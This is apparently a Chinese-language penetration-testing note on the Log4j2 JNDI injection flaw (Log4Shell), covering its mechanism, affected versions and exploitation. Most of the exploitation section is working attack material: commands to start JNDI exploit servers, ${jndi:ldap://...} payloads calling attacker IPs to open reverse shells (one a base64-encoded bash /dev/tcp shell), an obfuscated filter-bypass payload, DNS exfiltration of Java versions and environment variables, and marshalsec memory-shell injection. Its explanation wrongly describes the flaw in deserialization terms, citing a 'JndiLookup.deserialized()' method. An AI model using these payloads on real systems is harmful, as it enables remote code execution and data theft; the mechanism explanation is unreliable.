+++
title = 'Log4j2'
date = 2024-10-11T14:25:59+08:00
draft = false
private = true
show_reading_time = true
categories = 'Java组件'
+++


# 一、Log4j2

Log4j是Apache的一个开源项目，通过使用Log4j，我们可以控制日志信息输送的目的地是控制台、文件、GUI组件，甚至是套接口服务器、NT的事件记录器、UNIX Syslog守护进程等；我们也可以控制每一条日志的输出格式；通过定义每一条日志信息的级别，我们能够更加细致地控制日志的生成过程。


​ Log4j在工程中可以易用，方便等代替了 System.out 等打印语句，它是Java下最流行的日志输入工具，一些著名的开源项目，像spring、hibernate、struts都使用该工具作为日志输入工具，可以帮助调试（有时候debug是发挥不了作用的）和分析。

# 二、漏洞原理

由于log4j2库中的JNDI查询功能存在反序列化漏洞，具体来说是由于log4j2在处理日志事件时，使用了java反序列化机制(java Serialization)对java的对象和反序列化操作,没有对反序列化中的过程做安全的验证措施
导致可以构造恶意的JNDI名称的特殊日志来触发log4j2库中的JndiLookup.deserialized()方法调用，在执行反序操作时，可以利用java反序列漏洞，将恶意的代码注入到反序列化对象中，从而实现远程命令攻击。

来看一下正常使用的代码：




```
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
 
public class Log4j2Test {
    private static  final Logger logger = LogManager.getLogger();
    public static void main(String[] args) {
        String username = "world";
        logger.error("hello {}",username);
    }
```

正常这里会传入log4j2，hello word，如果我们传入${java:version}则会记录java版本， 大致的调用链如下：

MessagePatternConverter.format()会对```${```进行检测识别，并调用StrSubstitutor.replace()对传入的值进行处理StrSubstitutor类中多个方法处理到StrSubstitutor.substitute()将${jndi:rmi://192.168.198.134:9999/exp}处理解析为jndi:rmi://192.168.198.134:9999/exp后并调用resolveVariable()
StrSubstitutor.resolveVariable()调用lookup方法
判断识别jndi的处理类JndiLookup
JndiLookup.lookup()调用JndiManager.getDefaultManager()获得context
并通过JndiManager.lookup()调用java自身的InitialContext.lookup()，InitialContext类是执行命名操作的初始上下文，所有命名操作都相对于某一上下文，该初始上下文实现 Context 接口并提供解析名称的起始点，通过lookup()检索

到最后一步，如果看不明白可以详细查看JNDI注入的相关内容。

# 三、漏洞发现

由于日志框架，只能哪里有空哪里插，目前依赖于插件以及xray等工具进行检测

影响范围：Apache Log4j 2.x<=2.14.1

# 四、漏洞利用

开启log4j2的JNDI注入工具：

```
java -jar JNDIExploit-1.4-SNAPSHOT.jar -i 192.168.2.40
```

值得注意的是，此处的IP不能为回环地址，而必须为使用的IP地址

![](/zj_img/WEBRESOURCEf4a59216cb0105b4103e10fc35a7697b截图.png)

发送恶意payload:

基础payload:

```
${jndi:ldap://dadad.ceye.io}
```

反弹shell：

```
${jndi:ldap://10.10.14.147:1389/Basic/ReverseShell/10.10.14.147/8888}  实战中有失败案例
${jndi:ldap://10.10.14.147:1389/ldap://10.10.14.147:1389/Basic/Command/Base64/YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNDcvODg4OCAwPiYx}  使用较多
```

**另外一个工具的使用方式：**

坑点：空格少一个，多一个可能导致运行失败

```
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "bash -c {echo,Base64编码后的Payload}|{base64,-d}|{bash,-i}" -A "攻击机IP"
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIuNDAvODg4OCAwPiYx}|{base64,-d}|{bash,-i}" -A "192.168.2.40"
```

payload:

工具运行会显示：

![](/zj_img/WEBRESOURCE9efb3ef4b73730bb26e334823b026b48截图.png)

绕过payload示例：

```
${${::-j}${::-n}${::-d}${::-i}:ldap://120.24.183.94:1389/Basic/ReverseShell/120.24.183.94/65510}
```

TIPS:

可能遇到URL编码问题，可观察命令情况以及URL编解码解决

带出方法：

```
${jndi:ldap://${java:version}.u2xf5m.dnslog.cn}
```

DNS带出：

使用
```
logg.error("${jndi:dns://xxxxx:8090/${java:version}}");
```

在自己的VPS上nc -luvvp 8090即可收到信息





在自己的VPS上nc -luvvp 8090即可收到信息

![](/zj_img/WEBRESOURCE742b30da9f5e2149bd0c86065a925dda0d81a246a42ab1f05de994beb001bc62.png)

其他命令：

log4j-java





```
ID	usage	method
1	${java:version}	getSystemProperty("java.version")
2	${java:runtime}	getRuntime()
3	${java:vm}	getVirtualMachine()
4	${java:os}	getOperatingSystem()
5	${java:hw}	getHardware()
6	${java:locale}	getLocale()
```

Linux





```
id	usage
1	${env:CLASSPATH}
2	${env:HOME}
3	${env:JAVA_HOME}
4	${env:LANG}
5	${env:LOGNAME}
6	${env:MAIL}
7	${env:PATH}
8	${env:PWD}
9	${env:SHELL}
10	${env:USER}
```

Windows





```
id	usage
1	${env:A8_HOME}
2	${env:A8_ROOT_BIN}
3	${env:CLASSPATH}
4	${env:JRE_HOME}
5	${env:Java_Home}
6	${env:LOGONSERVER}
7	${env:OS}
8	${env:Path}
9	${env:USERDOMAIN}
10	${env:USERNAME}
```

log4j2-sys





```
id	usage
1	${sys:java.version}
2	${sys:os.name}
3	${sys:os.version}
4	${sys:user.name}
```

# 五、内存马注入

大致方式和fastjson jndi注入一致：

```
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://192.168.5.106:8888/#a" 9999
```

```
${jndi:rmi://192.168.5.106:9999/b}
```

![](/zj_img/WEBRESOURCE795910d646b10087b218070c30b1adfeimage.png)

受限于JDK版本和组件，注入方法可能不太一样，其他集成工具有待验证。